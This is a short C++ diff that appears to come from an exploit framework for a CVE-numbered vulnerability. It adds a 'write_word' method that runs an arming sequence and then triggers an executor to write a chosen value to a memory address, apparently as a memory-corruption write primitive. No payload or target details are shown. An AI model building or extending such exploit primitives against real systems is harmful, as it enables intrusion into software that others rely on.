@@ -87,6 +87,34 @@ namespace ghostlock::backend::cve_2026_43499::landing {
             return true;
         }
 
+        /** The same attempt, carrying the write shape to the controller when it accepts one. */
+        [[nodiscard]] bool write_word(std::uint64_t address, std::uint64_t value,
+                                      const memory::WriteRequest &request,
+                                      std::uint64_t offset) noexcept override {
+            if (limits_.arm_sequence <= 0) {
+                outcome_ = WindowOutcome::NoWarmUp;
+                return false;
+            }
+            for (std::int32_t attempt = 0; attempt < limits_.arm_sequence; ++attempt) {
+                if (!exec_.arm(attempt)) {
+                    outcome_ = WindowOutcome::NotLanded;
+                    return false;
+                }
+            }
+            bool executed = false;
+            if constexpr (requires { exec_.execute(request, value, offset); }) {
+                executed = exec_.execute(request, value, offset);
+            } else {
+                executed = exec_.execute(address, value, offset);
+            }
+            if (!executed) {
+                outcome_ = WindowOutcome::NotLanded;
+                return false;
+            }
+            outcome_ = WindowOutcome::Wrote;
+            return true;
+        }
+
         [[nodiscard]] WindowOutcome outcome() const noexcept { return outcome_; }
         /** How many rounds warmed the route, for the record. */
         [[nodiscard]] std::int32_t warm_up_rounds() const noexcept { return limits_.arm_sequence; }
